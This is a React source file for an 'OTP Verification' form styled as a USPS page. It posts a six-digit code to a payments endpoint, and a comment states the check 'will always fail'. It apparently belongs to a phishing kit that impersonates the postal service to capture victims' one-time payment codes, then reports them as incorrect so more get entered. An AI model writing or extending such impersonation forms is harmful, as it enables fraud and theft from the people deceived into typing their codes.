import React, { useState } from 'react';
import axios from 'axios';
import '../styles/uspsStyles.css'; 
const OtpForm = ({ formData, handleChange, setError }) => {
  const [loading, setLoading] = useState(false);
  const [otpError, setOtpError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setOtpError('');
    
    try {
      if (!formData.otp.match(/^\d{6}$/)) {
        throw new Error('OTP must be 6 digits');
      }
      
      // Send to backend - will always fail
      const response = await axios.post('/api/payments/verify-otp', {
        otp: formData.otp
      });
      
      if (!response.data.success) {
        setOtpError(response.data.error || 'OTP is incorrect');
      }
    } catch (err) {
      setOtpError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="usps-form">
      <h2>OTP Verification</h2>
      <p>We've sent a verification code to your registered mobile number.</p>
      
      <div className="form-group">
        <label>Enter OTP</label>
        <input
          type="text"
          name="otp"
          value={formData.otp}
          onChange={(e) => {
            // Only allow numbers
            const value = e.target.value.replace(/\D/g, '');
            handleChange({ target: { name: e.target.name, value } });
          }}
          maxLength="6"
          placeholder="123456"
          required
        />
      </div>
      
      {otpError && <div className="usps-error">{otpError}</div>}
      
      <button type="submit" disabled={loading} className="usps-button">
        {loading ? 'Verifying...' : 'Verify'}
      </button>
    </form>
  );
};

export default OtpForm;
